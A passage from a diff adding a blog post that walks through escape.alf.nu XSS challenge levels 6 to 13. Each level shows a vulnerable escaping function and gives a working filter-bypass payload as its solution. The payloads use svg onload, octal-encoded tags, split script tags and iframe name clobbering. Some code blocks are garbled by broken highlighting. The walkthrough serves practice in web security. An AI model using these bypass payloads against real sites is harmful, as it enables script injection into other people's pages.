+  <span class="nx">a</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nb">document</span><span class="p">[</span><span class="s1">'create'</span><span class="o">+</span><span class="nx">m</span><span class="p">[</span><span class="mi">0</span><span class="p">]].</span><span class="nx">apply</span><span class="p">(</span><span class="nb">document</span><span class="p">,</span> <span class="nx">m</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
+  <span class="k">return</span> <span class="nx">a</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>First I noticed the comment section and figured out how <code class="highlighter-rouge">TextNode#foo</code> would show up and it just showed <code class="highlighter-rouge">foo</code>. Then I started reviewing all the functions in the DOM that begin with <code class="highlighter-rouge">create</code> as it is there in the function. Then I figured out the <code class="highlighter-rouge">createComment</code> from which I tried giving <code class="highlighter-rouge">Comment#foo</code> which showed <code class="highlighter-rouge">&lt;!–&lt;foo&gt;–&gt;</code> from which it made easy for the solution.</p>
+
+<p><b>Solution</b>:  <code class="highlighter-rouge">Comment#&gt;&lt;svg/onload=alert(1)</code></p>
+
+<p><code class="highlighter-rouge">Level 7</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// Pass inn "callback#userdata"</span>
+  <span class="kd">var</span> <span class="nx">thing</span> <span class="o">=</span> <span class="nx">s</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="sr">/#/</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="sr">/^</span><span class="se">[</span><span class="sr">a-zA-Z</span><span class="se">\[\]</span><span class="sr">'</span><span class="se">]</span><span class="sr">*$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">thing</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="k">return</span> <span class="s1">'Invalid callback'</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'userdata'</span><span class="p">:</span> <span class="nx">thing</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">};</span>
+  <span class="kd">var</span> <span class="nx">json</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">obj</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;/g</span><span class="p">,</span> <span class="s1">'</span><span class="err">\\</span><span class="s1">u003c'</span><span class="p">);</span>
+  <span class="k">return</span> <span class="s2">""</span> <span class="o">+</span> <span class="nx">thing</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"("</span> <span class="o">+</span> <span class="nx">json</span> <span class="o">+</span><span class="s2">")"</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Pointed to be noted here was that, first I gave input as there in the comment part and tried to analyse how it being rendered. Then I tried to play with it such that <code class="highlighter-rouge">alert(1)</code> gets executed.</p>
+
+<p><b>Solution</b>: <code class="highlighter-rouge">‘#’;alert(1)//</code></p>
+
+<p><code class="highlighter-rouge">Level 8</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// Courtesy of Skandiabanken</span>
+  <span class="k">return</span> <span class="s1">'console.log("'</span> <span class="o">+</span> <span class="nx">s</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">()</span> <span class="o">+</span> <span class="s1">'")'</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Here, the point to be noted was that, the string which you enter is converted into uppercase. Hence we need to figure a way out to print <code class="highlighter-rouge">alert(1)</code>. Why not try <i>JSfuck</i>?</p>
+
+<p><b>Solution</b>: <code class="highlighter-rouge">“);&lt;alert(1)</code> in JSfuck&gt;;//</p>
+
+<p><code class="highlighter-rouge">Level 9</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// This is sort of a spoiler for the last level 🙂</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="sr">/</span><span class="se">[\\</span><span class="sr">&lt;&gt;</span><span class="se">]</span><span class="sr">/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">s</span><span class="p">))</span> <span class="k">return</span> <span class="s1">'-'</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="s1">'console.log("'</span> <span class="o">+</span> <span class="nx">s</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">()</span> <span class="o">+</span> <span class="s1">'")'</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This is the same thing as the previous case and would suggest the same solution that is by using JSFuck.</p>
+
+<p><code class="highlighter-rouge">Level 10</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">function</span> <span class="nx">htmlEscape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">s</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/./g</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+       <span class="k">return</span> <span class="p">{</span> <span class="s1">'&lt;'</span><span class="p">:</span> <span class="s1">'&amp;lt;'</span><span class="p">,</span> <span class="s1">'&gt;'</span><span class="p">:</span> <span class="s1">'&amp;gt;'</span><span class="p">,</span> <span class="s1">'&amp;'</span><span class="p">:</span> <span class="s1">'&amp;amp;'</span><span class="p">,</span> <span class="s1">'"'</span><span class="p">:</span> <span class="s1">'&amp;quot;'</span><span class="p">,</span> <span class="s2">"'"</span><span class="p">:</span> <span class="s1">''' }[x] || x;       
+     });
+  }
+
+  function expandTemplate(template, args) {
+    return template.replace(
+        /{(</span><span class="err">\</span><span class="s1">w+)}/g,
+        function(_, n) {
+           return htmlEscape(args[n]);
+         });
+  }
+
+  return expandTemplate(
+    "                                                </span><span class="err">\</span><span class="s1">n</span><span class="err">\</span><span class="s1">
+      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         </span><span class="err">\</span><span class="s1">n</span><span class="err">\</span><span class="s1">
+                                             </span><span class="err">\</span><span class="s1">n</span><span class="err">\</span><span class="s1">
+         var v = document.getElementById('</span><span class="nx">name</span><span class="s1">');    </span><span class="err">\</span><span class="s1">n</span><span class="err">\</span><span class="s1">
+         v.innerHTML = '</span><span class="p">{</span><span class="nx">name</span><span class="p">}</span><span class="s1">';       </span><span class="err">\</span><span class="s1">n</span><span class="err">\</span><span class="s1">
+                                           </span><span class="err">\</span><span class="s1">n</span><span class="err">\</span><span class="s1">
+    ",
+    { name : s }
+  );
+}</span></code></pre></figure>
+
+<p>Here once we try to execute, we can see that etc all are filtered except <code class="highlighter-rouge">‘ \ ‘</code>. So we convert to octal and then give.</p>
+
+<p><b>Solution</b>:  <code class="highlighter-rouge">\74svg onload=alert(1)\76</code></p>
+
+<p><code class="highlighter-rouge">Level 11</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// Spoiler for level 2</span>
+  <span class="nx">s</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">s</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="err">
+
+</span>  <span class="k">return</span> <span class="s1">'console.log('</span> <span class="o">+</span> <span class="nx">s</span> <span class="o">+</span> <span class="s1">');'</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>What happens here is that it just takes escapes <code class="highlighter-rouge">‘\’</code> and <code class="highlighter-rouge">‘ ” ‘</code> and not <code class="highlighter-rouge">&lt;</code> brackets and so after that function returns the values, it again gets checked for <code class="highlighter-rouge">“&lt;”</code> and replace it globally with <code class="highlighter-rouge">” “</code>.</p>
+
+<p><b>Solution</b>: <code class="highlighter-rouge">&lt;/&lt;/scriptscript&gt;alert(1);//</code></p>
+
+<p><code class="highlighter-rouge">Level 12</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// Pass inn "callback#userdata"</span>
+  <span class="kd">var</span> <span class="nx">thing</span> <span class="o">=</span> <span class="nx">s</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="sr">/#/</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="sr">/^</span><span class="se">[</span><span class="sr">a-zA-Z</span><span class="se">\[\]</span><span class="sr">'</span><span class="se">]</span><span class="sr">*$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">thing</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="k">return</span> <span class="s1">'Invalid callback'</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'userdata'</span><span class="p">:</span> <span class="nx">thing</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">};</span>
+  <span class="kd">var</span> <span class="nx">json</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">obj</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\/</span><span class="sr">/g</span><span class="p">,</span> <span class="s1">'</span><span class="err">\\</span><span class="s1">/'</span><span class="p">);</span>
+  <span class="k">return</span> <span class="s2">""</span> <span class="o">+</span> <span class="nx">thing</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"("</span> <span class="o">+</span> <span class="nx">json</span> <span class="o">+</span><span class="s2">")"</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Point to be noted is that backslashes are also being filtered and want to find a way out to comment it out and that is by <code class="highlighter-rouge">&lt;!–</code></p>
+
+<p><b>Solution</b>: <code class="highlighter-rouge">‘#’;alert(1)&lt;!–</code></p>
+
+<p><code class="highlighter-rouge">Level 13</code></p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">escape</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">tag</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'iframe'</span><span class="p">);</span>
+
+  <span class="c1">// For this one, you get to run any code you want, but in a "sandboxed" iframe.</span>
+  <span class="c1">//</span>
+  <span class="c1">// http://print.alf.nu/?html=... just outputs whatever you pass in.</span>
+  <span class="c1">//</span>
+  <span class="c1">// Alerting from print.alf.nu won't count; try to trigger the one below.</span>
+
+  <span class="nx">s</span> <span class="o">=</span> <span class="s1">'&lt;script&gt;'</span> <span class="o">+</span> <span class="nx">s</span> <span class="o">+</span> <span class="s1">'&lt;</span><span class="err">\</span><span class="s1">/script&gt;'</span><span class="p">;</span>
+  <span class="nx">tag</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s1">'http://print.alf.nu/?html='</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
+
+  <span class="nb">window</span><span class="p">.</span><span class="nx">WINNING</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">youWon</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> <span class="p">};</span>
+
+  <span class="nx">tag</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">youWon</span><span class="p">)</span> <span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">};</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">tag</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>iFrame has got a feature. It is setting the name attribute on an iFrame sets the name of the property in the global window object.</p>
+
+<p><b>Solution</b>: <code class="highlighter-rouge">name=’youWon’</code></p>
+
+<p>The rest of the solutions will be updated later. Do subscribe and raise questions if anything over here <a href="https://twitter.com/gkgkrishna33">Twitter</a></p>
+
+                <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-5012699001635479"
+     data-ad-slot="9244142234"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+            </article>
+
+            <section class="share">
+
+    <h3>Share</h3>
+
+    <a aria-label="Share on Twitter" href="https://twitter.com/intent/tweet?text=&quot;&quot;%20http://localhost:4000/Escape.alf.nu_Walkthrough/%20via%20&#64;gkgkrishna33&hashtags=JavaScript, escape.alf.nu,"
+    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
+        <svg class="icon icon-twitter"><use xlink:href="#icon-twitter"></use></svg>
+    </a>
+
+    <a aria-label="Share on Facebook"href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/Escape.alf.nu_Walkthrough/"
+    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
+        <svg class="icon icon-facebook"><use xlink:href="#icon-facebook"></use></svg>
+    </a>
+
+    <a aria-label="Share on Google Plus" href="https://plus.google.com/share?url=http://localhost:4000/Escape.alf.nu_Walkthrough/"
+    onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title="Share on Google+">
+        <svg class="icon icon-google-plus"><use xlink:href="#icon-google-plus"></use></svg>
+    </a>
+
+</section>
+
+            <footer>
+
+	<p>Made with <span id="heart">💚</span></p>
+	<p><a href="http://bi0s.in/">Team bi0s</p>
+
+</footer>
+
+            <script src="/assets/js/main.js"></script>
+            
+
+        </section>
+    </body>
+</html>
